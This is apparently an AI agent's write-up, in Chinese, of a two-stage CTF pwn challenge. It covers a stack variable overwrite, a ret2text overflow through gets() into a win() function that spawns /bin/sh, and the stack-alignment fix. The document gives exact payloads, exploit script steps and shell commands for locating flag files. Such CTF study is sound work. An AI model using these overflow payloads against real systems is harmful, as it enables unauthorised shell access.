## 题目结构：两关

`main` → `init`（三路 `setvbuf` 取消缓冲）→ 打印横幅 → `level1()`。

### Level 1 —— 局部变量覆盖（Memory Roaming）

```c
void level1(void) {
    int  magic;        // [rbp-0x4]
    char buf[0x20];    // [rbp-0x20]
    magic = 0;
    printf("[-] the address of buffer `buf` is about : %p", buf);
    printf("[-] the address of variables `magic` is about : %p", &magic);
    printf("Now input your Payload:\n> ");
    read(0, buf, 0x20);          // ← 恰好 32 字节
    if (magic != 0xdeadbeef) { printf("[-] Failure! ... 0x%x"); exit(0); }
    puts("[+] Congratulations! You have overwrited the magic ...");
    level2();
}
```

- `&magic - &buf = 0x20 - 0x4 = 28`
- `read` 上限 `0x20 = 32`，刚好够写 28 字节填充 + 4 字节 `magic`，**不碰 saved rbp**
- payload1 = `b'A' * 28 + p32(0xdeadbeef)`（`read` 不要求换行；实测 32 字节裸发即可）

### Level 2 —— ret2text（控制流劫持）

```c
void level2(void) {
    char buf[0x20];              // [rbp-0x20]
    puts("... [Level 2] The real challenge: control flow! (Ret2Text) ...");
    printf("I have prepared backdoor for you. 'win', It's addr about: %p", win);  // ← PIE 泄漏
    printf("Now input your final Payload:\n> ");
    gets(buf);                   // ← 无长度限制
}

void win(void) {
    puts("Congratulations! You have hijacked the control flow!");
    system("/bin/sh");           // ← /bin/sh 直接继承 fd 0/1/2 → 交互 shell
}
```

- `buf → saved RA` 偏移 = `0x20 + 8(saved rbp)` = **40**
- 程序**自己泄漏 `win` 的运行时地址**，所以 PIE 完全不是障碍

### ⚠ 关键坑：栈 16 字节对齐（必须垫一个 `ret`）

`level2` 由 `level1` 通过 `call` 进入，`rbp` 16 字节对齐，`leave; ret` 之后 `rsp % 16 == 0`。
而 SysV ABI 要求函数入口 `rsp % 16 == 8`（`call` 压了 8 字节返回地址）。
`win()` 里 `call system()` 时栈未对齐，glibc `do_system` 中的 `movaps` 直接 **SIGSEGV**。

实证（`evidence/16-alignment-proof.txt`）：

```
[WITHOUT ret gadget (off-by-8 stack)] exit=-11  out=b'<EOFError>'      # SIGSEGV
[WITH ret gadget    (aligned)      ] exit=None  out=b'Congratulations! You have hijacked the control flow!\n'
```

修正：payload 变成 `40*b'B' + p64(ret_gadget) + p64(win)`，多 pop 8 字节把 `rsp` 掰回 `%16 == 8`。

`ret` gadget 取 `win + 0x28`（即 `win` 尾部 `pop rbp; ret` 的 `ret`，file off `0x1231`）——
纯文件内固定偏移，PIE 下由泄漏值换算，**不需要 libc**。

## Exploit 逻辑（`scripts/16-solve.py`）

```
1. recvuntil "Now input your Payload:\n> "
2. send  b'A'*28 + p32(0xdeadbeef)                    # 过 Level 1
3. recvuntil "'win', It's addr about: " → int(line,16)  # 取 PIE 泄漏
4. recvuntil "Now input your final Payload:\n> "
5. sendline  b'B'*40 + p64(win+0x28) + p64(win)       # ret 对齐 + ret2text
6. → win() → system("/bin/sh") → 交互 shell
7. cat /flag /flag.txt /flag* ... + ls -la / + find，正则抓 0xGame{}/flag{}
```

用法：

```bash
# 本地
python3 scripts/16-solve.py

# 远程（拿到容器地址后）
python3 scripts/16-solve.py <address-host> 80
```

> 注意 `recvuntil` 的边界：`"Now input your final Payload:\n> "` 必须把 `> ` 一起吃掉，
> 否则残留的 `> ` 会被后续 `recv` 先读走（踩过一次）。

## 远程需要确认什么（BLOCKED: READY_FOR_CONTAINER）

1. **容器地址**（全队槽位 2 个被占，本 agent 未 `start`）。
2. **flag 路径**：脚本已扫 `/flag*`、`/flag.txt`、`flag*`、`./flag*`、`/home/*/flag*`、
   `/app/flag*`、`/root/flag*`，外加 `ls -la /` 与 `find -maxdepth 4 -iname 'flag*'`，
   还给了 dash 内建 glob 兜底。基本不需要额外确认。
3. **libc 版本 / ASLR：不需要**。
   - `win` 地址由程序 `printf("%p")` 自身泄漏 → ASLR 无关。
   - `ret` gadget 用 `win + 0x28` 同二进制内固定偏移 → 与 libc 无关。
   - 只用了 `gets` 栈溢出 + `system("/bin/sh")`，**无 ROP、无 libc 基址需求**。
4. 唯一理论风险：远程 `glibc` 的 `gets` 行为差异（不存在，`gets` 语义固定）
   / 远程 `win` 的低 12 位仍是 `0x209`（同二进制必然成立，脚本里有 assert 兜底）。
